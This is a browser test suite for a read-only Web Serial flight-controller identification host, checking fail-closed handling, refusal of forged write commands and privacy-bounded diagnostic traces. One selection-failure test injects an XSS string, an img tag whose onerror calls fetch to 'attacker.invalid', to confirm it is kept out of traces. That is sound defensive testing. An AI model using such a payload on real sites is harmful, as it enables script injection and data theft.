import { WebSerialReadonlyHost } from "./transport/webserial-readonly-host.mjs";
import initWasm, {
  WasmReadonlySerialDiscovery,
} from "virtual:ade-web-readonly-serial-wasm";

// Static, project-owned test fixtures. Production JavaScript has no MSP command constants,
// semantic parser, frame builder, or response fixtures.
const IN_SCOPE_REPLIES = [
  [36, 77, 62, 3, 1, 0, 1, 46, 45],
  [36, 77, 62, 4, 2, 66, 84, 70, 76, 26],
  [36, 77, 62, 3, 3, 4, 5, 5, 4],
  [36, 77, 62, 88, 4, 83, 52, 48, 53, 0, 0, 0, 0, 15, 83, 80, 69, 69, 68, 89, 66, 69, 69, 70, 52, 48, 53, 86, 52, 17, 83, 112, 101, 101, 100, 121, 66, 101, 101, 32, 70, 52, 48, 53, 32, 86, 52, 3, 83, 80, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 66],
].map((bytes) => Uint8Array.from(bytes));
const API_SCOPE_REPLIES = [
  ["lower-minor", [36, 77, 62, 3, 1, 0, 1, 45, 46], "1.45", "normal"],
  ["higher-minor", [36, 77, 62, 3, 1, 0, 1, 48, 51], "1.48", "split-frame"],
  ["incompatible-major", [36, 77, 62, 3, 1, 0, 2, 46, 46], "2.46", "whole-frame"],
  ["incompatible-protocol", [36, 77, 62, 3, 1, 1, 1, 46, 44], "1.46", "normal"],
];
function testReply(command, payload) {
  let checksum = payload.length ^ command;
  for (const byte of payload) checksum ^= byte;
  return Uint8Array.from([36, 77, 62, payload.length, command, ...payload, checksum]);
}
const API147_READONLY_REPLIES = [
  testReply(1, [0, 1, 47]),
  testReply(2, [...new TextEncoder().encode("BTFL")]),
  testReply(3, [25, 12, 1, 9, ...new TextEncoder().encode("2025.12.1")]),
  IN_SCOPE_REPLIES[3],
];
const FULL_SCOPE_MISMATCH_REPLIES = [
  ...IN_SCOPE_REPLIES.slice(0, 2),
  Uint8Array.from([36, 77, 62, 3, 3, 4, 5, 6, 7]),
  IN_SCOPE_REPLIES[3],
];
const EXPECTED_REQUESTS = [1, 2, 3, 4].map((command) =>
  Uint8Array.from([36, 77, 60, 0, command, command]),
);
const PROHIBITED_TEST_REQUESTS = [68, 184, 185, 250, 99].map((command) =>
  Uint8Array.from([36, 77, 60, 0, command, command]),
);

function assert(condition, message) {
  if (!condition) throw new Error(`Web Serial read-only refusal: ${message}`);
}

function equalBytes(left, right) {
  return left.length === right.length && left.every((value, index) => value === right[index]);
}

function refused(action) {
  try {
    action();
  } catch {
    return;
  }
  throw new Error("Web Serial read-only refusal: expected Rust refusal");
}

const mark = (step) => {
  document.querySelector("#result").textContent = `WEB_SERIAL_READONLY_RUNNING:${step}`;
};

class TestPort {
  constructor(replies, mode = "normal") {
    this.replies = replies;
    this.mode = mode;
    this.writes = [];
    this.queue = [];
    this.openOptions = null;
    this.openCount = 0;
    this.closeCount = 0;
    this.readerReleased = 0;
    this.writerReleased = 0;
    this.readerCancelled = 0;
    this.attemptWrites = 0;
    this.serialNumber = "SERIAL-SECRET-123";
    this.usbVendorId = "VID_1234";
    this.usbProductId = "PID_ABCD";
    this.path = "COM99:/private/path/raw-device-name";
    this.readable = {
      getReader: () => {
        if (this.mode === "reader-acquisition") {
          const error = new Error(this.path);
          error.name = "NetworkError";
          throw error;
        }
        return {
          read: () => this.#read(),
          cancel: async () => {
            this.readerCancelled += 1;
            if (this.mode === "reader-cancel-failure") throw new Error(this.serialNumber);
          },
          releaseLock: () => {
            this.readerReleased += 1;
            if (this.mode === "reader-release-failure") throw new Error(this.usbVendorId);
          },
        };
      },
    };
    this.writable = {
      getWriter: () => {
        if (this.mode === "writer-acquisition") {
          const error = new Error(this.path);
          error.name = "NetworkError";
          throw error;
        }
        return {
          write: async (bytes) => this.#write(bytes),
          releaseLock: () => {
            this.writerReleased += 1;
            if (this.mode === "writer-release-failure") throw new Error(this.usbProductId);
          },
        };
      },
    };
  }

  async open(options) {
    const openErrors = {
      "open-permission": "NotAllowedError",
      "open-busy": "InvalidStateError",
      "open-disconnected": "NetworkError",
      "open-unknown": "UnexpectedBrowserError",
    };
    if (openErrors[this.mode]) {
      const error = new Error(this.path);
      error.name = openErrors[this.mode];
      throw error;
    }
    this.openOptions = options;
    this.openCount += 1;
    this.attemptWrites = 0;
    this.queue.length = 0;
  }

  async close() {
    this.closeCount += 1;
    if (this.mode === "close-failure") {
      const error = new Error(this.path);
      error.name = "NetworkError";
      throw error;
    }
  }

  #write(bytes) {
    this.writes.push(Uint8Array.from(bytes));
    this.attemptWrites += 1;
    if (this.mode === "write-failure" && this.attemptWrites === 1) {
      const error = new Error(this.serialNumber);
      error.name = "NetworkError";
      throw error;
    }
    const reply = this.replies[this.attemptWrites - 1];
    if (reply) {
      if (this.mode === "error-direction" && this.attemptWrites === 1) {
        const errorReply = Uint8Array.from(reply);
        errorReply[2] = 33;
        this.queue.push(errorReply);
      } else if (this.mode === "bad-checksum" && this.attemptWrites === 1) {
        const bad = Uint8Array.from(reply);
        bad[bad.length - 1] ^= 1;
        this.queue.push(bad);
      } else if (this.mode === "wrong-command" && this.attemptWrites === 1) {
        this.queue.push(Uint8Array.from([36, 77, 62, 3, 2, 0, 1, 46, 46]));
      } else if (this.mode === "oversized" && this.attemptWrites === 1) {
        this.queue.push(Uint8Array.from([36, 77, 62, 123]));
      } else if (this.mode === "truncated-timeout" && this.attemptWrites === 1) {
        this.queue.push(reply.slice(0, reply.length - 1));
      } else if (
        (this.mode === "disconnect" && this.attemptWrites === 1) ||
        this.mode === `disconnect-${this.attemptWrites}`
      ) {
        this.queue.push(null);
      } else if (this.mode === `timeout-${this.attemptWrites}`) {
        // The bounded host timeout must be attributed to the current Rust stage.
      } else if (this.mode === "whole-frame") {
        this.queue.push(reply);
      } else if (this.mode === "split-frame") {
        this.queue.push(reply.slice(0, 3), reply.slice(3));
      } else if (this.mode === "trailing-bytes" && this.attemptWrites === 1) {
        this.queue.push(Uint8Array.from([...reply, 0xaa]));
      } else if (this.mode === "coalesced-frame" && this.attemptWrites === 1) {
        this.queue.push(Uint8Array.from([...reply, ...this.replies[1]]));
      } else if (this.mode === "chunk-bound" && this.attemptWrites === 1) {
        for (let index = 0; index < 128; index += 1) this.queue.push(new Uint8Array());
      } else if (this.mode === "exact-chunk-boundary" && this.attemptWrites === 1) {
        for (let index = 0; index < 127; index += 1) this.queue.push(new Uint8Array());
        this.queue.push(reply);
      } else {
        for (const byte of reply) this.queue.push(Uint8Array.of(byte));
      }
    }
  }

  #read() {
    if (this.mode === "read-failure" && this.attemptWrites === 1) {
      const error = new Error(this.path);
      error.name = "NetworkError";
      return Promise.reject(error);
    }
    if (this.queue.length > 0) {
      const chunk = this.queue.shift();
      return Promise.resolve(chunk === null ? { done: true } : { done: false, value: chunk });
    }
    return new Promise(() => {});
  }
}

class TestSerial {
  constructor(port, selectionError = null) {
    this.port = port;
    this.selectionError = selectionError;
    this.requestCount = 0;
  }

  async requestPort() {
    this.requestCount += 1;
    if (this.selectionError) throw this.selectionError;
    return this.port;
  }
}

function hostFor(serial, timeoutMs = 30) {
  return new WebSerialReadonlyHost({
    serial,
    timeoutMs,
  });
}

function assertPrivacyBoundedTrace(host, forbidden = []) {
  const trace = host.diagnosticTrace();
  const allowedKeys = new Set([
    "sequence", "layer", "phase", "event", "stage", "command", "byteCount",
    "direction", "failureClass", "failureReason", "origin",
  ]);
  assert(trace.length <= 200, "trace ring remains bounded");
  trace.forEach((event, index) => {
    assert(Object.isFrozen(event), `trace event ${index} is immutable`);
    assert(
      Object.keys(event).every((key) => allowedKeys.has(key)),
      `trace event ${index} contains only safe fields`,
    );
    assert(Number.isSafeInteger(event.sequence), `trace event ${index} has a sequence`);
  });
  const copied = host.safeDiagnosticTraceText();
  for (const value of forbidden) {
    assert(!JSON.stringify(trace).includes(value), "trace excludes injected browser data");
    assert(!copied.includes(value), "copy excludes injected browser data");
  }
  return trace;
}

async function runDiscovery(replies, mode = "normal", timeoutMs = 30) {
  const port = new TestPort(replies, mode);
  const serial = new TestSerial(port);
  const host = hostFor(serial, timeoutMs);
  const selected = await host.selectPortFromUserGesture();
  assert(selected.ok, "explicit selection should succeed");
  const result = await host.discover();
  return { result, port, serial, host };
}

async function scenarioAUnavailable() {
  mark("A-api-unavailable");
  const host = hostFor(null);
  const selected = await host.selectPortFromUserGesture();
  assert(!selected.ok && selected.failure === "Unavailable", "stable unavailable result");
  assert(selected.failureOrigin === "PORT_SELECTION", "unavailable origin is explicit");
  const trace = assertPrivacyBoundedTrace(host);
  assert(trace.at(-1).event === "FINAL_FAILED", "unavailable trace is terminal");
}

async function scenarioBCancelled() {
  mark("B-selection-failures");
  for (const [name, expected] of [
    ["NotFoundError", "Cancelled"],
    ["NotAllowedError", "PermissionDenied"],
  ]) {
    const injected =
      `COM99 SERIAL-SECRET-123 VID_1234 PID_ABCD /private/path raw-device-name ` +
      `<img src=x onerror=fetch('https://attacker.invalid/${expected}')>`;
    const error = new Error(injected);
    error.name = name;
    const serial = new TestSerial(null, error);
    const host = hostFor(serial);
    const selected = await host.selectPortFromUserGesture();
    assert(!selected.ok && selected.failure === expected, `stable ${expected} result`);
    assert(selected.failureOrigin === "PORT_SELECTION", `fixed origin for ${expected}`);
    assert(serial.requestCount === 1, `one explicit requestPort call for ${expected}`);
    assertPrivacyBoundedTrace(host, [
      injected,
      "COM99",
      "SERIAL-SECRET-123",
      "VID_1234",
      "PID_ABCD",
      "/private/path",
      "raw-device-name",
      "attacker.invalid",
    ]);
  }
}

async function scenarioCSuccessAndGCleanup() {
  mark("C-success-G-cleanup");
  const run = await runDiscovery(IN_SCOPE_REPLIES);
  assert(
    run.result.outcome === "in-scope",
    `typed in-scope result (${JSON.stringify(run.result)}, writes=${run.port.writes.length})`,
  );
  assert(run.result.apiVersion === "1.46", "typed API version");
  assert(run.result.fcVariant === "BTFL", "typed FC variant");
  assert(run.result.fcVersion === "4.5.5", "typed FC version");
  assert(run.result.targetName === "SPEEDYBEEF405V4", "typed target");
  assert(run.result.readProfileId === "api-1.46-legacy", "Rust-selected legacy read profile");
  assert(
    run.result.readProfileWriteAuthority === "never-authorizes-writes",
    "read profile cannot authorize writes",
  );
  assert(run.result.capabilityStatus === "review-only-match", "exact capability match evidence");
  assert(
    run.result.capabilityPackId === "bf-4.5.5-api1.46-speedybeef405v4-review",
    "stable review-only pack id",
  );
  assert(run.result.capabilityTrust === "review-only-embedded", "review-only trust evidence");
  assert(run.result.capabilityWritePolicy === "writes-blocked", "capability writes remain blocked");
  assert(run.result.hardwareObserved === false, "software evidence only");
  assert(run.port.openOptions?.baudRate === 115200, "internal baud rate");
  assert(run.port.writes.length === 4, "exactly four writes");
  EXPECTED_REQUESTS.forEach((expected, index) =>
    assert(equalBytes(run.port.writes[index], expected), `request order ${index}`),
  );
  assert(run.port.readerReleased === 1, "reader lock released");
  assert(run.port.writerReleased === 1, "writer lock released");
  assert(run.port.closeCount === 1, "port closed exactly once");
  const trace = assertPrivacyBoundedTrace(run.host, ["SPEEDYBEEF405V4", "BTFL"]);
  assert(trace.at(-1).event === "FINAL_OK", "success trace ends explicitly");
  assert(
    trace.filter((event) => event.event === "RX_CHUNK").every((event) => !("direction" in event)),
    "browser RX chunks do not invent MSP direction",
  );
  assert(
    trace.filter((event) => event.event === "DIRECTIVE").map((event) => event.command).join(",") ===
      "MSP_API_VERSION,MSP_FC_VARIANT,MSP_FC_VERSION,MSP_BOARD_INFO",
    "Rust emitted the exact four ordered commands",
  );
  const acceptedFrames = trace.filter((event) => event.event === "FRAME_ACCEPTED");
  assert(acceptedFrames.length === 4, "Rust accepted exactly four MSP frames");
  assert(
    acceptedFrames.every((event) => event.direction === "REPLY"),
    "Rust authoritatively reports normal reply direction",
  );
  assert(
    trace.filter((event) => event.event === "IDENTITY_STAGE_OK").length === 4,
    "Rust accepted exactly four typed identity stages",
  );
}

async function scenarioDAuthorityRefusal() {
  mark("D-authority-refusal");
  assert(WebSerialReadonlyHost.length === 0, "constructor has no required trust argument");
  assert(WebSerialReadonlyHost.prototype.discover.length === 0, "discover accepts no authority");
  assert(typeof WebSerialReadonlyHost.setRustBindings === "undefined", "no binding setter");
  assert(typeof WebSerialReadonlyHost.prototype.sendRaw === "undefined", "no raw host API");
  assert(typeof WebSerialReadonlyHost.prototype.writeCommand === "undefined", "no command API");
  assert(typeof WasmReadonlySerialDiscovery.prototype.sendRaw === "undefined", "no raw Rust API");
  assert(typeof WasmReadonlySerialDiscovery.prototype.writeCommand === "undefined", "no Rust command API");

  for (const prohibited of PROHIBITED_TEST_REQUESTS) {
    let fakeTypeChecks = 0;
    class FakeDirective {
      static [Symbol.hasInstance]() {
        fakeTypeChecks += 1;
        return true;
      }

      constructor() {
        this.kind = "exchange-identification-read";
        this.bytes = prohibited;
        this.commandId = prohibited[4];
        this.requestId = "1";
      }
    }
    const forgeries = [
      ["class directive", new FakeDirective()],
      ["plain directive", {
        kind: "exchange-identification-read",
        bytes: prohibited,
        commandId: prohibited[4],
        requestId: "1",
      }],
    ];
    for (const [label, forgedDirective] of forgeries) {
      let fakeBeginCalls = 0;
      const fakeDiscovery = {
        begin() {
          fakeBeginCalls += 1;
          return forgedDirective;
        },
      };
      const port = new TestPort([], "open-failure");
      port.open = async () => {
        port.openCount += 1;
        throw new Error("injected open refusal");
      };
      const host = new WebSerialReadonlyHost({
        serial: new TestSerial(port),
        timeoutMs: 15,
        rustDirectiveType: FakeDirective,
        directiveType: FakeDirective,
        discoveryFactory: () => fakeDiscovery,
        bindings: { discovery: fakeDiscovery, directive: forgedDirective },
        validator: () => true,
      });
      assert((await host.selectPortFromUserGesture()).ok, `${label} probe selected`);
      const result = await host.discover(fakeDiscovery, forgedDirective, prohibited, prohibited[4]);
      assert(result.outcome === "failed", `${label} remains fail closed`);
      assert(fakeBeginCalls === 0, `${label} discovery was not observed`);
      assert(fakeTypeChecks === 0, `${label} class was not observed`);
      assert(port.writes.length === 0, `${label} bytes cannot reach writer`);
    }
  }
}

function scenarioECorrelation() {
  mark("E-correlation");
  const bridge = new WasmReadonlySerialDiscovery();
  try {
    const open = bridge.begin();
    refused(() => bridge.acceptOpenSuccess("2"));
    refused(() => bridge.acceptCloseSuccess(open.requestId));
    const exchange = bridge.acceptOpenSuccess(open.requestId);
    refused(() => bridge.acceptOpenSuccess(open.requestId));
    refused(() => bridge.acceptReadChunk(open.requestId, Uint8Array.of(36)));
    assert(exchange.requestId !== open.requestId, "request id advanced exactly");
    open.free();
    exchange.free();
  } finally {
    bridge.free();
  }
}

async function scenarioFFailClosed() {
  mark("F-malformed-timeout-disconnect");
  for (const [mode, expected, stage, reason] of [
    ["bad-checksum", "MalformedResponse", "API_VERSION", "BadChecksum"],
    ["truncated-timeout", "Timeout", undefined, undefined],
    ["disconnect", "Disconnected", undefined, undefined],
    ["oversized", "MalformedResponse", "API_VERSION", "FrameTooLarge"],
    ["wrong-command", "MalformedResponse", "API_VERSION", "WrongCommand"],
    ["error-direction", "ProtocolIdentityFailure", "API_VERSION", "ErrorReply"],
  ]) {
    const run = await runDiscovery(IN_SCOPE_REPLIES, mode, 15);
    assert(run.result.outcome === "failed", `${mode} failed`);
    assert(run.result.failure === expected, `${mode} stable failure`);
    assert(run.result.failureStage === stage, `${mode} bounded stage`);
    assert(run.result.failureReason === reason, `${mode} bounded reason`);
    assert(
      run.result.failureOrigin ===
        (mode === "truncated-timeout"
          ? "SERIAL_TIMEOUT"
          : mode === "disconnect"
            ? "SERIAL_READ"
            : mode === "error-direction"
              ? "IDENTITY_STAGE"
              : "MSP_FRAME"),
      `${mode} fixed failure origin`,
    );
    assert(run.port.closeCount === 1, `${mode} closed`);
    assert(run.port.readerReleased === 1, `${mode} reader released`);
    assert(run.port.writerReleased === 1, `${mode} writer released`);
    const trace = assertPrivacyBoundedTrace(run.host);
    assert(trace.at(-1).event === "FINAL_FAILED", `${mode} trace is terminal`);
    assert(
      trace
        .filter((event) => event.event === "RX_CHUNK" || event.event === "RX_FAILED")
        .every((event) => !("direction" in event)),
      `${mode} browser RX trace does not invent direction`,
    );
    if (reason && mode !== "error-direction") {
      const rejected = trace.find((event) => event.event === "FRAME_REJECTED");
      assert(rejected?.failureReason === reason, `${mode} Rust trace reason`);
      assert(rejected?.origin === "MSP_FRAME", `${mode} Rust trace origin`);
    }
    if (mode === "error-direction") {
      const accepted = trace.find((event) => event.event === "FRAME_ACCEPTED");
      assert(accepted?.direction === "ERROR", "Rust authoritatively reports error direction");
      const identityFailure = trace.find((event) => event.event === "IDENTITY_STAGE_FAILED");
      assert(identityFailure?.failureReason === "ErrorReply", "Rust classifies the error reply");
      assert(identityFailure?.origin === "IDENTITY_STAGE", "Rust owns the error-reply origin");
    }
  }
}

async function scenarioHScopeMismatch() {
  mark("H-scope-mismatch");
  for (const [label, apiReply, apiVersion, mode] of API_SCOPE_REPLIES) {
    const run = await runDiscovery([Uint8Array.from(apiReply)], mode);
    assert(run.result.outcome === "api-unsupported", `${label} typed compatibility outcome`);
    assert(
      run.result.scopeMismatchField ===
        (label === "incompatible-protocol" ? "protocol_version" : "msp_api_version"),
      `${label} typed mismatch field`,
    );
    assert(run.result.apiVersion === apiVersion, `${label} retains only the parsed API fact`);
    assert(run.result.fcVariant === undefined, `${label} has no FC variant`);
    assert(run.result.fcVersion === undefined, `${label} has no FC version`);
    assert(run.result.targetName === undefined, `${label} has no board identity`);
    assert(run.result.failure !== "ProtocolIdentityFailure", `${label} is not malformed`);
    assert(run.result.hardwareObserved === false, `${label} is not hardware evidence`);
    assert(run.port.writes.length === 1, `${label} sends only MSP_API_VERSION`);
    assert(equalBytes(run.port.writes[0], EXPECTED_REQUESTS[0]), `${label} exact first request`);
    assert(run.port.closeCount === 1, `${label} closes exactly once`);
    const trace = assertPrivacyBoundedTrace(run.host, ["SPEEDYBEEF405V4", "BTFL"]);
    assert(
      trace.filter((event) => event.event === "DIRECTIVE").length === 1,
      `${label} has no second Rust directive`,
    );
  }

  const full = await runDiscovery(FULL_SCOPE_MISMATCH_REPLIES);
  assert(full.result.outcome === "scope-mismatch", "complete identity scope mismatch result");
  assert(full.result.scopeMismatchField === "fc_version", "complete typed mismatch field");
  assert(full.result.readProfileId === "api-1.46-legacy", "scope mismatch retains read profile");
  assert(
    full.result.readProfileWriteAuthority === "never-authorizes-writes",
    "scope mismatch cannot authorize writes",
  );
  assert(full.result.capabilityStatus === "no-reviewed-match", "scope mismatch has no pack match");
  assert(full.result.capabilityPackId === undefined, "scope mismatch selects no capability pack");
  assert(full.result.capabilityTrust === undefined, "scope mismatch carries no pack trust");
  assert(full.result.capabilityWritePolicy === undefined, "scope mismatch carries no pack policy");
  assert(full.result.hardwareObserved === false, "complete scope is not hardware evidence");
  assert(full.port.writes.length === 4 && full.port.closeCount === 1, "four-read stop and close");

  const port = new TestPort([Uint8Array.from(API_SCOPE_REPLIES[1][1])], "split-frame");
  const host = hostFor(new TestSerial(port), 15);
  for (let attempt = 1; attempt <= 2; attempt += 1) {
    assert((await host.selectPortFromUserGesture()).ok, `unsupported retry selection ${attempt}`);
    const result = await host.discover();
    assert(result.outcome === "api-unsupported", `unsupported retry outcome ${attempt}`);
  }
  assert(port.openCount === 2 && port.closeCount === 2, "unsupported retries close cleanly");
  assert(port.writes.length === 2, "unsupported retries send only one API read each");
}

async function scenarioH2Api147ReadOnly() {
  mark("H2-api147-read-only");
  const run = await runDiscovery(API147_READONLY_REPLIES);
  assert(run.result.outcome === "read-only-complete", "API 1.47 completes read-only identity");
  assert(run.result.apiVersion === "1.47", "API 1.47 is retained");
  assert(run.result.fcVariant === "BTFL", "API 1.47 exact variant retained");
  assert(run.result.fcVersion === "2025.12.1", "API 1.47 strict version string retained");
  assert(run.result.targetName === "SPEEDYBEEF405V4", "API 1.47 target retained");
  assert(
    run.result.readProfileId === "api-1.47-calendar-extended",
    "Rust-selected API 1.47 read profile",
  );
  assert(
    run.result.readProfileWriteAuthority === "never-authorizes-writes",
    "API 1.47 read profile cannot authorize writes",
  );
  assert(
    run.result.capabilityStatus === "not-reviewed",
    "API 1.47 capability stays unselected until separate descriptor review",
  );
  assert(run.result.capabilityPackId === undefined, "API 1.47 selects no capability pack");
  assert(run.result.capabilityTrust === undefined, "API 1.47 carries no capability trust");
  assert(run.result.capabilityWritePolicy === undefined, "API 1.47 carries no pack write policy");
  assert(run.result.scopeMismatchField === undefined, "read-only completion is not API unsupported");
  assert(run.result.hardwareObserved === false, "read-only completion is not hardware validation");
  assert(run.port.writes.length === 4, "API 1.47 uses exactly four empty reads");
  EXPECTED_REQUESTS.forEach((expected, index) =>
    assert(equalBytes(run.port.writes[index], expected), `API 1.47 request order ${index}`),
  );
}

async function scenarioIHostFailureOriginsAndRetry() {
  mark("I-host-origins-retry");
  const cases = [
    ["open-permission", "PermissionDenied", "PORT_OPEN"],
    ["open-busy", "PortBusy", "PORT_OPEN"],
    ["open-disconnected", "Disconnected", "PORT_OPEN"],
    ["open-unknown", "Unknown", "PORT_OPEN"],
    ["writer-acquisition", "Disconnected", "WRITER_ACQUISITION"],
    ["reader-acquisition", "Disconnected", "READER_ACQUISITION"],
    ["write-failure", "Disconnected", "SERIAL_WRITE"],
    ["read-failure", "Disconnected", "SERIAL_READ"],
    ["close-failure", "CloseFailure", "PORT_CLOSE"],
    ["reader-cancel-failure", "CloseFailure", "READER_CANCEL"],
    ["reader-release-failure", "CloseFailure", "READER_RELEASE"],
    ["writer-release-failure", "CloseFailure", "WRITER_RELEASE"],
  ];
  for (const [mode, failure, origin] of cases) {
    const run = await runDiscovery(IN_SCOPE_REPLIES, mode, 15);
    assert(run.result.outcome === "failed", `${mode} fails closed`);
    assert(run.result.failure === failure, `${mode} stable failure class`);
    assert(run.result.failureOrigin === origin, `${mode} stable failure origin`);
    const trace = assertPrivacyBoundedTrace(run.host, [
      "COM99",
      "SERIAL-SECRET-123",
      "VID_1234",
      "PID_ABCD",
      "/private/path",
      "raw-device-name",
    ]);
    assert(trace.at(-1).event === "FINAL_FAILED", `${mode} terminal trace`);
    assert(trace.at(-1).origin === origin, `${mode} final trace origin`);
  }

  const port = new TestPort(IN_SCOPE_REPLIES);
  const serial = new TestSerial(port);
  const host = hostFor(serial, 15);
  for (let attempt = 1; attempt <= 2; attempt += 1) {
    assert((await host.selectPortFromUserGesture()).ok, `retry selection ${attempt}`);
    const result = await host.discover();
    assert(result.outcome === "in-scope", `retry discovery ${attempt}`);
    const trace = assertPrivacyBoundedTrace(host);
    assert(trace[0].sequence === 1, `retry ${attempt} resets trace sequence`);
    assert(trace.at(-1).event === "FINAL_OK", `retry ${attempt} terminal success`);
  }
  assert(port.openCount === 2 && port.closeCount === 2, "repeated attempts reopen and reclose");
  assert(port.writes.length === 8, "repeated attempts retain exactly four reads each");
}

async function scenarioJStreamAndStageMatrix() {
  mark("J-stream-stage-matrix");
  for (const mode of ["whole-frame", "split-frame", "exact-chunk-boundary"]) {
    const run = await runDiscovery(IN_SCOPE_REPLIES, mode, 15);
    assert(run.result.outcome === "in-scope", `${mode} has the same typed result`);
    assert(run.port.writes.length === 4, `${mode} keeps four commands`);
    const trace = assertPrivacyBoundedTrace(run.host);
    assert(
      trace.filter((event) => event.event === "RX_CHUNK").every((event) => !("direction" in event)),
      `${mode} browser fragments do not invent direction`,
    );
    assert(
      trace
        .filter((event) => event.event === "FRAME_ACCEPTED")
        .every((event) => event.direction === "REPLY"),
      `${mode} preserves the authoritative Rust reply direction`,
    );
  }

  for (const mode of ["trailing-bytes", "coalesced-frame"]) {
    const run = await runDiscovery(IN_SCOPE_REPLIES, mode, 15);
    assert(run.result.outcome === "failed", `${mode} fails closed`);
    assert(run.result.failure === "MalformedResponse", `${mode} malformed class`);
    assert(run.result.failureReason === "TrailingBytes", `${mode} trailing-byte reason`);
    assert(run.result.failureOrigin === "MSP_FRAME", `${mode} parser origin`);
  }

  const bounded = await runDiscovery(IN_SCOPE_REPLIES, "chunk-bound", 15);
  assert(bounded.result.failure === "Timeout", "chunk-count bound fails as timeout");
  assert(bounded.result.failureOrigin === "SERIAL_TIMEOUT", "chunk-count bound origin");
  assertPrivacyBoundedTrace(bounded.host);

  const stages = ["API_VERSION", "FC_VARIANT", "FC_VERSION", "BOARD_INFO"];
  for (let stageIndex = 1; stageIndex <= stages.length; stageIndex += 1) {
    for (const [kind, failure, origin] of [
      ["timeout", "Timeout", "SERIAL_TIMEOUT"],
      ["disconnect", "Disconnected", "SERIAL_READ"],
    ]) {
      const run = await runDiscovery(IN_SCOPE_REPLIES, `${kind}-${stageIndex}`, 15);
      assert(run.result.failure === failure, `${kind} class at ${stages[stageIndex - 1]}`);
      assert(run.result.failureOrigin === origin, `${kind} origin at ${stages[stageIndex - 1]}`);
      const trace = assertPrivacyBoundedTrace(run.host);
      const failedRead = trace.find((event) => event.event === "RX_FAILED");
      assert(failedRead?.stage === stages[stageIndex - 1], `${kind} trace stage`);
      assert(!("direction" in failedRead), `${kind} RX failure has no invented direction`);
      assert(run.port.writes.length === stageIndex, `${kind} exact write count`);
    }
  }
}

async function run() {
  await initWasm({
    module_or_path: new URL(
      "./wasm/ade_web_readonly_serial_wasm_bridge_bg.wasm",
      globalThis.location.href,
    ),
  });
  await scenarioAUnavailable();
  await scenarioBCancelled();
  await scenarioCSuccessAndGCleanup();
  await scenarioDAuthorityRefusal();
  scenarioECorrelation();
  await scenarioFFailClosed();
  await scenarioHScopeMismatch();
  await scenarioH2Api147ReadOnly();
  await scenarioIHostFailureOriginsAndRetry();
  await scenarioJStreamAndStageMatrix();
}

const output = document.querySelector("#result");
try {
  await run();
  document.body.dataset.result = "pass";
  output.textContent = "WEB_SERIAL_READONLY_BROWSER_PASS:A+B+C+D+E+F+G+H+I+J";
} catch (error) {
  document.body.dataset.result = "fail";
  const name = error instanceof Error ? error.name : "UnknownError";
  const message = error instanceof Error ? error.message : String(error);
  const step = output.textContent;
  const stack = error instanceof Error ? error.stack : undefined;
  output.textContent = `WEB_SERIAL_READONLY_BROWSER_FAIL:${step}:${name}:${message}:${stack ?? ""}`;
}
